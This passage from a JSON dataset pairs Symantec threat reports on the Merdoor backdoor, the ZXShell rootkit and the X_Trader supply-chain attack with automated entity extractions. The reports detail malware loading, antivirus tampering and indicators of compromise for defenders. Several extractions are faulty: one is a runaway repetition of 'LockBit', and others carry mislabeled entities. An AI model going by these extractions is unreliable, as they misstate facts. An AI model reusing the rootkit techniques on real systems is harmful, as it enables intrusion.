      "raw_output": "Named Entities: (Buhti, Threat Type), (LockBit, Malware), (Babuk, Malware), (PaperCut, Vulnerability), (Windows, OS), (Linux, OS), (Blacktail, Attacker), (LockBit Black, Malware), (LockBit, Malware), (LockBit 3.0, Malware), (LockBit, Malware), (LockBit Black, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware), (LockBit, Malware),",
      "entities": [
        [
          "Buhti",
          "Threat Type"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "Babuk",
          "Malware"
        ],
        [
          "PaperCut",
          "Vulnerability"
        ],
        [
          "Windows",
          "OS"
        ],
        [
          "Linux",
          "OS"
        ],
        [
          "Blacktail",
          "Attacker"
        ],
        [
          "LockBit Black",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit 3.0",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit Black",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 42,
    "relationship_count": 0
  },
  {
    "title": "lancefly merdoor zxshell custom backdoor",
    "link": "https://www.security.com/threat-intelligence/lancefly-merdoor-zxshell-custom-backdoor",
    "content": "The Lancefly advanced persistent threat (APT) group is using a custom-written backdoor in attacks targeting organizations in South and Southeast Asia, in activity that has been ongoing for several years. Lancefly may have some links to previously known groups, but these are low confidence, which led researchers at Symantec, byBroadcom Software, to classify this activity under a new group name. Lancefly’s custom malware, which we have dubbed Merdoor, is a powerful backdoor that appears to have existed since 2018. Symantec researchers observed it being used in some activity in 2020 and 2021, as well as this more recent campaign, which continued into the first quarter of 2023. The motivation behind both these campaigns is believed to be intelligence gathering. The backdoor is used very selectively, appearing on just a handful of networks and a small number of machines over the years, with its use appearing to be highly targeted. The attackers in this campaign also have access to an updated version of the ZXShell rootkit. The targets in this most recent activity, which began in mid-2022 and continued into 2023, are based in South and Southeast Asia, in sectors including government, aviation, education, and telecoms. Symantec researchers previously saw the Merdoor backdoor used in activity that targeted victims in the same geographies in the government, communications, and technology sectors in 2020 into 2021. Like this recent activity, that activity also appeared to be highly targeted, with only a small number of machines infected. Merdoor is a fully-featured backdoor that appears to have been in existence since 2018. The backdoor contains the following functionality: Instances of the Merdoor backdoor are usually identical with the exception of embedded and encrypted configuration, which determines: Typically, the backdoor is injected into the legitimate processes perfhost.exe or svchost.exe. The Merdoor dropper is a self-extracting RAR (SFX) that contains three files: When opened, the dropper extracts embedded files and executes a legitimate binary in order to load the Merdoor loader. Merdoor dropper variants have been found that abuse older versions of five different legitimate applications for the purpose of DLL sideloading: Evidence from Lancefly’s earlier campaign that began in 2020 suggested that in that instance the group may have used a phishing email with a lure based on the 37th ASEAN Summit as an initial infection vector. In this more recent activity, the initial infection vector was not entirely clear. We saw some indications of what the initial infection vector may have been in two victims, though this was not conclusive. While evidence for any of these infection vectors is not definitive, it does appear to indicate that Lancefly is adaptable when it comes to the kind of infection vectors it uses. Credential theft using non-malware techniques In activity that also aligned with their earlier campaign in 2020/2021, the attackers used a number of non-malware techniques for credential theft on victim machines: The attackers also used a masqueraded version of the legitimate archiving tool WinRAR to stage and encrypt files before exfiltration. Notable attack chain tools and TTPs A typical Merdoor attack chain, as seen in one of the victims, appears to be: The ZXShell rootkit wasfirst reported on by Cisco in 2014, but the version of the tool used by Lancefly is updated, indicating that it continues to be actively developed. The source code of this rootkit is publicly available so it may be used by multiple different groups. The new version of the rootkit used by Lancefly appears to be smaller in size, while it also has additional functions and targets additional antivirus software to disable. The loader for the rootkit is a 32-bit DLL with the export directory name \"FormDll.dll\" (SHA256: 1f09d177c99d429ae440393ac9835183d6fd1f1af596089cc01b68021e2e29a7).It has the following exports: Whenever the export \"LoadSys\" is executed, it drops one of the following files based on the processor architecture: These files are a malicious Windows Kernel driver. This is a variant of a driver that wasfirst documented in an RSAblog several years ago. It has the PDB filename: \"c:\\google\\objchk_win7_amd64\\amd64\\Google.pdb\" The sample creates the device: \"\\Device\\TdiProxy0\". It also creates the symbolic link \"\\DosDevices\\TdiProxy0\", so that it can be controlled using the pathname “\\\\.\\TdiProxy0”. After this, the loader timestamps the dropped file by copying the timestamps from the file \"[WindowsDirectory]\\system32\\drivers\\http.sys\". Then it creates a service with the following parameters: \"CallDriver\" opens the following device, which was created by the“\\\\.\\TdiProxy0”malicious kernel driver. It communicates with it using theDeviceIoControlAPI. The export expects two arguments. The first argument determines the dwIoControlCode parameter to use when calling theDeviceIoControlAPI and it should be one of the following strings: Any other values result in what looks like a buggy dwIoControlCode value. The second argument is a string to pass as an lpInBuffer parameter when calling theDeviceIoControlAPI, after conversion using theMultiByteToWideCharAPI. Whenever the export \"DoRVA\" is executed, it reads the following file: The file should start with the magic string \"AP32\" and contains shellcode to execute in compressed form. Export \"KillAvpProcess\" This enumerates running processes and for selected processes and calls its own export \"CallDriver\" with the following parameters: The export expects a single string parameter to compare with the executable file of running processes for selection. Export \"ProtectDllFile\" This calls its own export \"CallDriver\" with the following parameters: Next, it sets the following registry value: This is a 32-bit executable with the PDB filename: \"M:\\Project\\database\\10.0.18362\\Form\\Release\\Form.pdb\". (SHA256: 180970fce4a226de05df6d22339dd4ae03dfd5e451dcf2d464b663e86c824b8e) Whenever the sample is executed, it loads the following DLL: It also calls its export: \"DoRVA\". Installation and Update Utility The installation and update utility is a 32-bit PE executable (SHA256: a6020794bd6749e0765966cd65ca6d5511581f47cc2b38e41cb1e7fddaa0b221) that shares small but distinctive fragments of code with the Merdoor loader, which is what indicates they are part of the same toolset. Whenever the sample is executed, it attempts to read and delete the following file containing its configuration data: Next, it checks that: If both checks pass, the sample attempts to tamper with various antivirus products using the \"\\\\.\\TdiProxy0\" device. For example, it may terminate the processes \"egui.exe\", \"ekrn.exe\", and \"msmpeng.exe\". Next, it attempts to rename the file \"[FILE_DIRECTORY_OF_RUNNING_EXECUTABLE]\\res.dat\" as one of the following (depending on the Windows version): Based on the structure of the code, the above file should start with the magic string \"AP32\" and could contain a DLL file in compressed form. The sample then decompresses the renamed file \"temp.temp\". When decompressing, it may create the temporary file \"temp.temp.pack\" in the same folder. Next, the sample appends a certain marker followed by the content of \"[FILE_DIRECTORY_OF_RUNNING_EXECUTABLE]\\res.ini\" (partially transformed using the XOR algorithm with the byte key 0x12) at the end of the decompressed file. Additionally, it also creates the following registry value: Then the sample checks if the following file exists: If so, the sample renames the updated \"temp.temp\" file to replace it.Otherwise, it checks the following registry value for the pathname to replace: If that fails, it uses a default from configuration data. Finally, it checks the following registry value for a service name: It restarts the referred service. Installation functionality The sample attempts to decompress the following file: Then it may modify one of the following registry values to hijack the corresponding service: Next, it starts the corresponding service and then removes the registry value. It then attempts to tamper with various antivirus products using the \"\\\\.\\TdiProxy0\" device. It then creates a service with the following parameters: Then it creates the following registry value: It then deletes the following registry values: Next, it renames the following file: Based on the structure of the code, the above file should start with the magic string \"AP32\" and could contain a DLL file in compressed form (using aPLib for compression). The sample then decompresses the renamed \"[PER CONFIGURATION DATA].back\" as \"[PER CONFIGURATION DATA]\". Next, the sample appends a certain marker followed by the content of \"[FILE_DIRECTORY_OF_RUNNING_EXECUTABLE]\\res.ini\" (partially transformed using the XOR algorithm with the byte key 0x12) at the end of the decompressed file. Additionally, it also creates the following registry value: Finally, when the configuration data includes the option \"OneSelfKey\", it makes a compressed copy of its own executable as (using aPLib for compression): Some samples include an embedded archive with the final payload: This is a variant of the ZXShell backdoor (SHA256: d5df686bb202279ab56295252650b2c7c24f350d1a87a8a699f6034a8c0dd849). The ZXShell rootkit used by Lancefly is signed by the certificate \"Wemade Entertainment Co. Ltd\", which was previously reported to be associated with APT41 (aka Blackfly/Grayfly). However, it is known that Chinese APT groups, such as APT41,often share certificateswith other APT groups. The ZXShell backdoor has also previously been used by the HiddenLynx/APT17 group, but as the source code of ZXShell is now publicly available this does not provide a definitive link between these two groups. Also notable is that the ZXShell rootkit loader component has the name \"formdll.dll\" and it has the ability to read the file \"Form.hlp\" and execute its contents as shellcode. Those same files were mentioned as being used in a previous reportdetailing activity by the Iron Tiger (aka Budworm/APT27) group. In that case, the attackers used these filenames when loading the PlugX backdoor onto victim machines. The prevalence of such files is very low, which may indicate a potential link between that campaign and this more recent activity. PlugX is also seen being used by Lancefly. PlugX is a remote access Trojan (RAT) with multiple functionalities including backdoor access and data exfiltration. PlugX has existed for well over a decade. It was originally used by Chinese APT groups, but its use is now very widespread, meaning it is difficult to use it as a way of attributing activity. ShadowPad is also used by these attackers. ShadowPad is a modular RAT believed to be exclusively used by Chinese APT groups. Its capabilities are similar to PlugX, and it is often referred to as a successor to that malware. While these overlaps and shared tools may indicate some links between Lancefly activity and activity by other APT groups, none of the overlaps are strong enough to attribute this activity and the development of the Merdoor backdoor to an already-known attack group. This recent Lancefly activity is of note due to its use of the Merdoor backdoor, but also the low prevalence of this backdoor and the seemingly highly targeted nature of these attacks. While the Merdoor backdoor appears to have been in existence for several years, it appears to only have been used in a small number of attacks in that time period. This prudent use of the tool may indicate a desire by Lancefly to keep its activity under the radar. The tools used and sectors targeted all point to the motivations of this attack campaign being intelligence gathering. The similarities between this recent activity and earlier activity by Lancefly indicate that the group perhaps did not realize the earlier activity had been discovered, so it was not concerned about links being made between the two. Whether or not the exposure of this activity will lead to any alteration in how the group carries out its activity remains to be seen. For the latest protection updates, please visit theSymantec Protection Bulletin. SHA256FilenameDescription 13df2d19f6d2719beeff3b882df1d3c9131a292cf097b27a0ffca5f45e139581 – a.exe – Merdoor Dropper 8f64c25ba85f8b77cfba3701bebde119f610afef6d9a5965a3ed51a4a4b9dead – chrome_frame_helper.exe – Merdoor Dropper 8e98eed2ec14621feda75e07379650c05ce509113ea8d949b7367ce00fc7cd38 – siteadv.exe – Merdoor Dropper 89e503c2db245a3db713661d491807aab3d7621c6aff00766bc6add892411ddc – siteadv.exe – Merdoor Dropper c840e3cae2d280ff0b36eec2bf86ad35051906e484904136f0e478aa423d7744 –siteadv.exe –Merdoor Dropper 5f16633dbf4e6ccf0b1d844b8ddfd56258dd6a2d1e4fb4641e2aa508d12a5075 –chrome_frame_helper.dll – Merdoor Loader ff4c2a91a97859de316b434c8d0cd5a31acb82be8c62b2df6e78c47f85e57740 –chrome_frame_helper.dll – Merdoor Loader 14edb3de511a6dc896181d3a1bc87d1b5c443e6aea9eeae70dbca042a426fcf3 –chrome_frame_helper.dll – Merdoor Loader db5deded638829654fc1595327400ed2379c4a43e171870cfc0b5f015fad3a03 –chrome_frame_helper.dll – Merdoor Loader e244d1ef975fcebb529f0590acf4e7a0a91e7958722a9f2f5c5c05a23dda1d2c –chrome_frame_helper.dll – Merdoor Loader f76e001a7ccf30af0706c9639ad3522fd8344ffbdf324307d8e82c5d52d350f2 –chrome_frame_helper.dll – Merdoor Loader dc182a0f39c5bb1c3a7ae259f06f338bb3d51a03e5b42903854cdc51d06fced6 – smadhook64c.dll – Merdoor Loader fa5f32457d0ac4ec0a7e69464b57144c257a55e6367ff9410cf7d77ac5b20949 – SiteAdv.dll, chrome_frame_helper.dll –Merdoor Loader fe7a6954e18feddeeb6fcdaaa8ac9248c8185703c2505d7f249b03d8d8897104 – siteadv.dll – Merdoor Loader 341d8274cc1c53191458c8bbc746f428856295f86a61ab96c56cd97ee8736200 – siteadv.dll – Merdoor Loader f3478ccd0e417f0dc3ba1d7d448be8725193a1e69f884a36a8c97006bf0aa0f4 – siteadv.dll – Merdoor Loader 750b541a5f43b0332ac32ec04329156157bf920f6a992113a140baab15fa4bd3 – mojo_core.dll – Merdoor Loader 9f00cee1360a2035133e5b4568e890642eb556edd7c2e2f5600cf6e0bdcd5774 – libmupdf.dll – Merdoor Loader a9051dc5e6c06a8904bd8c82cdd6e6bd300994544af2eed72fe82df5f3336fc0 – chrome_frame_helper.dll – Merdoor Loader d62596889938442c34f9132c9587d1f35329925e011465c48c94aa4657c056c7 – smadhook64c.dll – Merdoor Loader f0003e08c34f4f419c3304a2f87f10c514c2ade2c90a830b12fdf31d81b0af57 – SiteAdv.pak – Merdoor encoded payload 139c39e0dc8f8f4eb9b25b20669b4f30ffcbe2197e3a9f69d0043107d06a2cb4 – SiteAdv.pak – Merdoor encoded payload 11bb47cb7e51f5b7c42ce26cbff25c2728fa1163420f308a8b2045103978caf5 – SiteAdv.pak – Merdoor encoded payload 0abc1d12ef612490e37eedb1dd1833450b383349f13ddd3380b45f7aaabc8a75 – SiteAdv.pak – Merdoor encoded payload eb3b4e82ddfdb118d700a853587c9589c93879f62f576e104a62bdaa5a338d7b –SiteAdv.exe – Legit McAfee executable 1ab4f52ff4e4f3aa992a77d0d36d52e796999d6fc1a109b9ae092a5d7492b7dd – chrome_frame_helper.exe – Legit Google executable fae713e25b667f1c42ebbea239f7b1e13ba5dc99b225251a82e65608b3710be7 – SmadavProtect64.exe – Legit SmadAV executable File hashes, simplified list 13df2d19f6d2719beeff3b882df1d3c9131a292cf097b27a0ffca5f45e139581 8f64c25ba85f8b77cfba3701bebde119f610afef6d9a5965a3ed51a4a4b9dead 8e98eed2ec14621feda75e07379650c05ce509113ea8d949b7367ce00fc7cd38 89e503c2db245a3db713661d491807aab3d7621c6aff00766bc6add892411ddc c840e3cae2d280ff0b36eec2bf86ad35051906e484904136f0e478aa423d7744 5f16633dbf4e6ccf0b1d844b8ddfd56258dd6a2d1e4fb4641e2aa508d12a5075 ff4c2a91a97859de316b434c8d0cd5a31acb82be8c62b2df6e78c47f85e57740 14edb3de511a6dc896181d3a1bc87d1b5c443e6aea9eeae70dbca042a426fcf3 db5deded638829654fc1595327400ed2379c4a43e171870cfc0b5f015fad3a03 e244d1ef975fcebb529f0590acf4e7a0a91e7958722a9f2f5c5c05a23dda1d2c f76e001a7ccf30af0706c9639ad3522fd8344ffbdf324307d8e82c5d52d350f2 dc182a0f39c5bb1c3a7ae259f06f338bb3d51a03e5b42903854cdc51d06fced6 fa5f32457d0ac4ec0a7e69464b57144c257a55e6367ff9410cf7d77ac5b20949 fe7a6954e18feddeeb6fcdaaa8ac9248c8185703c2505d7f249b03d8d8897104 341d8274cc1c53191458c8bbc746f428856295f86a61ab96c56cd97ee8736200 f3478ccd0e417f0dc3ba1d7d448be8725193a1e69f884a36a8c97006bf0aa0f4 750b541a5f43b0332ac32ec04329156157bf920f6a992113a140baab15fa4bd3 9f00cee1360a2035133e5b4568e890642eb556edd7c2e2f5600cf6e0bdcd5774 a9051dc5e6c06a8904bd8c82cdd6e6bd300994544af2eed72fe82df5f3336fc0 d62596889938442c34f9132c9587d1f35329925e011465c48c94aa4657c056c7 f0003e08c34f4f419c3304a2f87f10c514c2ade2c90a830b12fdf31d81b0af57 139c39e0dc8f8f4eb9b25b20669b4f30ffcbe2197e3a9f69d0043107d06a2cb4 11bb47cb7e51f5b7c42ce26cbff25c2728fa1163420f308a8b2045103978caf5 0abc1d12ef612490e37eedb1dd1833450b383349f13ddd3380b45f7aaabc8a75 eb3b4e82ddfdb118d700a853587c9589c93879f62f576e104a62bdaa5a338d7b 1ab4f52ff4e4f3aa992a77d0d36d52e796999d6fc1a109b9ae092a5d7492b7dd fae713e25b667f1c42ebbea239f7b1e13ba5dc99b225251a82e65608b3710be7 1f09d177c99d429ae440393ac9835183d6fd1f1af596089cc01b68021e2e29a7 180970fce4a226de05df6d22339dd4ae03dfd5e451dcf2d464b663e86c824b8e a6020794bd6749e0765966cd65ca6d5511581f47cc2b38e41cb1e7fddaa0b221 592e237925243cf65d30a0c95c91733db593da64c96281b70917a038da9156ae 929b771eabef5aa9e3fba8b6249a8796146a3a4febfd4e992d99327e533f9798 009d8d1594e9c8bc40a95590287f373776a62dad213963662da8c859a10ef3b4 ef08f376128b7afcd7912f67e2a90513626e2081fe9f93146983eb913c50c3a8 ee486e93f091a7ef98ee7e19562838565f3358caeff8f7d99c29a7e8c0286b28 32d837a4a32618cc9fc1386f0f74ecf526b16b6d9ab6c5f90fb5158012fe2f8c d5df686bb202279ab56295252650b2c7c24f350d1a87a8a699f6034a8c0dd849 a1f9b76ddfdafc47d4a63a04313c577c0c2ffc6202083422b52a00803fd8193d 3ce38a2fc896b75c2f605c135297c4e0cddc9d93fc5b53fe0b92360781b5b94e 210934a2cc59e1f5af39aa5a18aae1d8c5da95d1a8f34c9cfc3ab42ecd37ac92 530c7d705d426ed61c6be85a3b2b49fd7b839e27f3af60eb16c5616827a2a436 5018fe25b7eac7dd7bc30c7747820e3c1649b537f11dbaa9ce6b788b361133bf efa9e9e5da6fba14cb60cba5dbd3f180cb8f2bd153ca78bbacd03c270aefd894 a5a4dacddfc07ec9051fb7914a19f65c58aad44bbd3740d7b2b995262bd0c09e 10b96290a17511ee7a772fcc254077f62a8045753129d73f0804f3da577d2793 0dcfcdf92e85191de192b4478aba039cb1e1041b1ae7764555307e257aa566a7 415f9dc11fe242b7a548be09a51a42a4b5c0f9bc5c32aeffe7a98940b9c7fc04 947f7355aa6068ae38df876b2847d99a6ca458d67652e3f1486b6233db336088 8d77fe4370c864167c1a712d0cc8fe124b10bd9d157ea59db58b42dea5007b63 d8cc2dc0a96126d71ed1fce73017d5b7c91465ccd4cdcff71712381af788c16d e94a5bd23da1c6b4b8aec43314d4e5346178abe0584a43fa4a204f4a3f7464b9 5655a2981fa4821fe09c997c84839c16d582d65243c782f45e14c96a977c594e 19ec3f16a42ae58ab6feddc66d7eeecf91d7c61a0ac9cdc231da479088486169 41d174514ed71267aaff578340ff83ef00dbb07cb644d2b1302a18aa1ca5d2d0 67ebc03e4fbf1854a403ea1a3c6d9b19fd9dc2ae24c7048aafbbff76f1bea675 f92cac1121271c2e55b34d4e493cb64cdb0d4626ee30dc77016eb7021bf63414 859e76b6cda203e84a7b234c5cba169a7a02bf028a5b75e2ca8f1a35c4884065 fcdec9d9b195b8ed827fb46f1530502816fe6a04b1f5e740fda2b126df2d9fd5 9584df964369c1141f9fc234c64253d8baeb9d7e3739b157db5f3607292787f2 711a347708e6d94da01e4ee3b6cdb9bcc96ebd8d95f35a14e1b67def2271b2e9 f040a173b954cdeadede3203a2021093b0458ed23727f849fc4c2676c67e25db 90edb2c7c3ba86fecc90e80ac339a42bd89fbaa3f07d96d68835725b2e9de3ba b0d25b06e59b4cca93e40992fa0c0f36576364fcf1aca99160fd2a1faa5677a2 4c55f48b37f3e4b83b6757109b6ee0a661876b41428345239007882993127397 3e1c8d982b1257471ab1660b40112adf54f762c570091496b8623b0082840e9f 9830f6abec64b276c9f327cf7c6817ad474b66ea61e4adcb8f914b324da46627 79ae300ac4f1bc7636fe44ce2faa7e5556493f7013fc5c0a3863f28df86a2060 The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Lancefly APT, Attacker), (backdoor, Malware), (Merdoor, Malware), (ZXShell rootkit, Tool), (South and Southeast Asia, Region), (government, Sector), (aviation, Sector), (education, Sector), (telecoms, Sector)\nRelationships: (Lancefly APT, uses, backdoor), (Lancefly APT, uses, Merdoor), (Lancefly APT, targets, South and Southeast Asia), (Lancefly APT, uses, ZXShell rootkit), (South and Southeast Asia, regionallyAssociatedWith, government), (South and Southeast Asia, regionallyAssociatedWith, aviation), (South and Southeast Asia, regionallyAssociatedWith, education), (South and Southeast Asia, regionallyAssociatedWith, telecoms)",
      "entities": [
        [
          "Lancefly APT",
          "Attacker"
        ],
        [
          "backdoor",
          "Malware"
        ],
        [
          "Merdoor",
          "Malware"
        ],
        [
          "ZXShell rootkit",
          "Tool"
        ],
        [
          "South and Southeast Asia",
          "Region"
        ],
        [
          "government",
          "Sector"
        ],
        [
          "aviation",
          "Sector"
        ],
        [
          "education",
          "Sector"
        ],
        [
          "telecoms",
          "Sector"
        ]
      ],
      "relationships": [
        [
          "Lancefly APT",
          "uses",
          "backdoor"
        ],
        [
          "Lancefly APT",
          "uses",
          "Merdoor"
        ],
        [
          "Lancefly APT",
          "targets",
          "South and Southeast Asia"
        ],
        [
          "Lancefly APT",
          "uses",
          "ZXShell rootkit"
        ],
        [
          "South and Southeast Asia",
          "regionallyAssociatedWith",
          "government"
        ],
        [
          "South and Southeast Asia",
          "regionallyAssociatedWith",
          "aviation"
        ],
        [
          "South and Southeast Asia",
          "regionallyAssociatedWith",
          "education"
        ],
        [
          "South and Southeast Asia",
          "regionallyAssociatedWith",
          "telecoms"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 9,
    "relationship_count": 8
  },
  {
    "title": "xtrader 3cx supply chain",
    "link": "https://www.security.com/threat-intelligence/xtrader-3cx-supply-chain",
    "content": "The X_Trader software supply chain attack affected more organizations than 3CX. Initial investigation by Symantec’s Threat Hunter Team has, to date, found that among the victims are two critical infrastructure organizations in the energy sector, one in the U.S. and the other in Europe. In addition to this, two other organizations involved in financial trading were also breached. As reported yesterday by Mandiant, Trojanized X_Trader software was the cause of the 3CX breach, which was uncovered last month. As a result of this breach,3CX’s software was compromised, with many customers inadvertently downloading malicious versions of the company’s voice and video calling software DesktopApp.In addition to wider victims, Symantec has also discovered additional indicators of compromise, listed below. It appears likely that the X_Trader supply chain attack is financially motivated, since Trading Technologies, the developer of X_Trader, facilitates futures trading, including energy futures. Nevertheless, the compromise of critical infrastructure targets is a source of concern. North Korean-sponsored actors are known to engage in both espionage and financially motivated attacks and it cannot be ruled out that strategically important organizations breached during a financial campaign are targeted for further exploitation. The infection chain starts with the Trojanized installer named X_TRADER_r7.17.90p608.exe (SHA256: 900b63ff9b06e0890bf642bdfcbfcc6ab7887c7a3c057c8e3fd6fba5ffc8e5d6), which is digitally signed by \"Trading Technologies International, Inc.\" and contains a malicious executable named Setup.exe. Our analysis of one version of this executable (SHA256: aa318070ad1bf90ed459ac34dc5254acc178baff3202d2ea7f49aaf5a055dd43) found that when executed, it examined the file named X_TRADER-ja.mst (also contained in the installer) for the following marker bytes at hardcoded offset 0x167000: If the marker bytes are present, it creates a folder named: It then copies the file C:\\Windows\\Sysnative\\immersivetpmvscmgrsvr.exe as C:\\Programdata\\TPM\\TpmVscMgrSvr.exe to the new folder. Next, it will drop two malicious DLLs: The content of the dropped files is generated by decrypting chunks of the file X_TRADER-ja.mst mentioned earlier using the XOR algorithm with the following key: To achieve persistence on the victim’s system, the malware invokes a CLSID_TaskScheduler COM object, possibly to create a scheduled task to run periodically the following file: Setup.exe then drops a file named X_TRADER.exe, also contained within the installer. The content of the dropped file is generated by decrypting chunks from one of its own portable executable resources starting at hardcoded offset 0x1CB40 using the XOR algorithm with the following key: Setup will then execute X_Trader.exe before deleting itself. Once installed, the legitimate X_Trader executable side-loads the two malicious DLLs dropped by the installer. The first, winscard.dll, acts as a loader and contains code that will load and execute a payload from the second (msvcr100.dll). The msvcr100.dll file contains an encrypted blob appended to the file. The blob starts with the hex value FEEDFACE, which the loader uses to find the blob. The process for payload installation is almost identical as that seen with the Trojanized 3CX app, where two side-loaded DLLs are used to extract a payload from an encrypted blob. In this attack, the payload extracted is a modular backdoor called Veiledsignal (SHA256: e185c99b3d1085aed9fda65a9774abd73ecf1229f14591606c6c59e9660c4345). Veiledsignal contains another DLL (SHA256: 19442d9e476e3ef990ce57b683190301e946ccb28fc88b69ab53a93bf84464ae), which is a process-injection module. This can be injected into the Chrome, Firefox, or Edge web browsers. The module contains a second DLL (SHA256: f8c370c67ffb3a88107c9022b17382b5465c4af3dd453e50e4a0bd3ae9b012ce), which is a command-and-control (C&C) module. It connects to the following C&C URL: The discovery that 3CX was breached by another, earlier supply chain attack made it highly likely that further organizations would be impacted by this campaign, which now transpires to be far more wide-ranging than originally believed. The attackers behind these breaches clearly have a successful template for software supply chain attacks and further, similar attacks cannot be ruled out. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 900b63ff9b06e0890bf642bdfcbfcc6ab7887c7a3c057c8e3fd6fba5ffc8e5d6 - Trojanized installer (X_TRADER_r7.17.90p608.exe) 6e989462acf2321ff671eaf91b4e3933b77dab6ab51cd1403a7fe056bf4763ba – Possible Trojanized installer aa318070ad1bf90ed459ac34dc5254acc178baff3202d2ea7f49aaf5a055dd43 - Malicious component of Trojanized installer (setup.exe) 6e11c02485ddd5a3798bf0f77206f2be37487ba04d3119e2d5ce12501178b378 - Malicious component of Trojanized installer (setup.exe) 47a8e3b20405a23f7634fa296f148cab39a7f5f84248c6afcfabf5201374d1d1 - Benign Windows executable used for side-loading (tpmvscmgrsvr.exe) cc4eedb7b1f77f02b962f4b05278fa7f8082708b5a12cacf928118520762b5e2 – Veiledsignal loader (winscard.dll) 277119738f4bdafa1cde9790ec82ce1e46e04cebf6c43c0e100246f681ba184e – Veiledsignal loader (devobj.dll) cb374af8990c5f47b627596c74e2308fbf39ba33d08d862a2bea46631409539f – Malicious DLL (msvcr100.dll) d937e19ccb3fd1dddeea3eaaf72645e8cd64083228a0df69c60820289b1aa3c0 – Malicious DLL (msvcr100.dll) e185c99b3d1085aed9fda65a9774abd73ecf1229f14591606c6c59e9660c4345 - Veiledsignal main component 19442d9e476e3ef990ce57b683190301e946ccb28fc88b69ab53a93bf84464ae - Veiledsignal process-injection module f8c370c67ffb3a88107c9022b17382b5465c4af3dd453e50e4a0bd3ae9b012ce - Veiledsignal communications module https://www.tradingtechnologies[.]com/trading/order-management - Veiledsignal C&C server \\\\.\\pipe\\gecko.nativeMessaging.in.foo8bc16e6288f2a -Veiledsignal named pipe Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40 - Veiledsignal user agent The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (X_Trader, Tool), (Trojanized X_Trader software, Malware), (3CX, Attacker), (Trading Technologies, Tool), (energy futures, Vulnerability), (North Korea, Attacker)\\nRelationships: (X_Trader, downloads, Trojanized X_Trader software), (Trojanized X_Trader software, contains, X_TRADER_r7.17.90p608.exe), (Trojanized X_Trader software, exploitedBy, North Korean-sponsored actors)",
      "entities": [
        [
          "X_Trader",
          "Tool"
        ],
        [
          "Trojanized X_Trader software",
          "Malware"
        ],
        [
          "3CX",
          "Attacker"
        ],
        [
          "Trading Technologies",
          "Tool"
        ],
        [
          "energy futures",
          "Vulnerability"
        ],
        [
          "North Korea",
          "Attacker"
        ],
        [
          "X_Trader",
          "downloads",
          "Trojanized X_Trader software"
        ],
        [
          "Trojanized X_Trader software",
          "contains",
          "X_TRADER_r7.17.90p608.exe"
        ],
        [
          "Trojanized X_Trader software",
          "exploitedBy",
          "North Korean-sponsored actors"
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 9,
    "relationship_count": 0
  },
  {
    "title": "apt attacks telecoms africa mgbot",
    "link": "https://www.security.com/threat-intelligence/apt-attacks-telecoms-africa-mgbot",
    "content": "A telecommunications organization in Africa appears to be among the latest targets for the Daggerfly (aka Evasive Panda, Bronze Highland) advanced persistent threat (APT) group, with the group’s most recent campaign using previously unseen plugins from the MgBot malware framework. The first indications of malicious activity on this victim’s network were seen in November 2022, but there are indications the activity is likely still ongoing. Researchers from the Threat Hunter Team at Symantec, byBroadcom Software, found multiple unique plugins associated with the MgBot modular malware framework on the victim’s network. The attackers were also seen using a PlugX loader and abusing the legitimate AnyDesk remote desktop software. Use of the MgBot modular malware framework and PlugX loader have been associated in the past with China-linked APTs. Association between this activity and Daggerfly is based in part on detailsin a 2020 blog about activity that Malwarebytes attributed to Evasive Panda. Crossovers in the activity included: The folders and file names used in this recent activity, as well as the use of DLL side-loading, also support the attribution. The activity documented by Malwarebytes occurred in 2020, and Daggerfly is believed to have been active since at least 2014. Suspicious AnyDesk connections spotted on a Microsoft Exchange mail server in 